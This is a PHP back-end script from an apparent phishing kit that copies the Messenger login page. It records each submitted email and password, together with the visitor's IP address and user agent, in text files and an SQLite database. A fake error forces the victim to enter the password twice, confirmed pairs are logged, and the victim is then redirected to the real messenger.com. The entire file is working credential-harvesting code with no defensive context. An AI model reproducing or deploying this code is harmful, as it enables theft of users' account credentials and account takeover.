<?php
session_start();

class MessengerCredentialManager {
    private $platformCode = 'MSG';
    private $platformName = 'messenger';
    private $captureDir;
    private $dbFile;
    
    public function __construct() {
        $this->captureDir = '../../captures/' . $this->platformCode;
        if (!file_exists($this->captureDir)) {
            mkdir($this->captureDir, 0755, true);
        }
        $this->dbFile = $this->captureDir . '/' . $this->platformCode . '_credentials.db';
        $this->initDB();
    }
    
    private function initDB() {
        try {
            $db = new SQLite3($this->dbFile);
            $db->exec('CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                email TEXT,
                password TEXT,
                password_confirmed TEXT,
                ip_address TEXT,
                user_agent TEXT,
                attempt_count INTEGER,
                is_confirmed BOOLEAN
            )');
            $db->close();
        } catch (Exception $e) {}
    }
    
    private function getIP() {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
        if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
        }
        return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'Unknown';
    }
    
    public function capture($postData, $attempt = 1) {
        $ip = $this->getIP();
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
        $timestamp = date('Ymd_His');
        
        $txtFile = $this->captureDir . '/MSG_' . $timestamp . '_attempt' . $attempt . '.txt';
        
        $content = "═══════════════════════════════════════════════════════════\n";
        $content .= "[ MESSENGER CAPTURE - ATTEMPT $attempt ] - " . date('Y-m-d H:i:s') . "\n";
        $content .= "═══════════════════════════════════════════════════════════\n";
        
        $email = '';
        $password = '';
        
        foreach ($postData as $key => $value) {
            if ($key == 'platform' || $key == 'attempt') continue;
            if ($key == 'pass') {
                $content .= "PASSWORD      : $value\n";
                $password = $value;
            } elseif ($key == 'email') {
                $content .= "EMAIL/USER    : $value\n";
                $email = $value;
            } else {
                $content .= "$key           : $value\n";
            }
        }
        
        $content .= "\nIP ADDRESS    : $ip\n";
        $content .= "USER AGENT    : $ua\n";
        $content .= "═══════════════════════════════════════════════════════════\n\n";
        
        file_put_contents($txtFile, $content, FILE_APPEND | LOCK_EX);
        
        try {
            $db = new SQLite3($this->dbFile);
            $stmt = $db->prepare('INSERT INTO credentials (email, password, ip_address, user_agent, attempt_count, is_confirmed) 
                                  VALUES (:e, :p, :ip, :ua, :att, :conf)');
            $stmt->bindValue(':e', $email, SQLITE3_TEXT);
            $stmt->bindValue(':p', $password, SQLITE3_TEXT);
            $stmt->bindValue(':ip', $ip, SQLITE3_TEXT);
            $stmt->bindValue(':ua', $ua, SQLITE3_TEXT);
            $stmt->bindValue(':att', $attempt, SQLITE3_INTEGER);
            $stmt->bindValue(':conf', 0, SQLITE3_INTEGER);
            $stmt->execute();
            $db->close();
        } catch (Exception $e) {}
        
        if ($attempt == 1) {
            $_SESSION['msg_email'] = $email;
            $_SESSION['msg_pass1'] = $password;
        } else {
            $pass1 = $_SESSION['msg_pass1'] ?? '';
            $confirmed = ($password === $pass1);
            if ($confirmed) {
                file_put_contents($this->captureDir . '/CONFIRMED_SUMMARY.txt', 
                    "✅ CONFIRMED | $email | $password | " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);
            }
            session_destroy();
        }
        
        return true;
    }
    
    public function redirect() {
        header('Location: https://www.messenger.com');
        exit;
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $attempt = isset($_POST['attempt']) ? (int)$_POST['attempt'] : 1;
    $manager = new MessengerCredentialManager();
    $manager->capture($_POST, $attempt);
    
    if ($attempt == 1) {
        $email = $_POST['email'] ?? '';
        header('Location: index.html?error=1&email=' . urlencode($email));
    } else {
        $manager->redirect();
    }
    exit;
}
header('Location: index.html');
exit;
?>
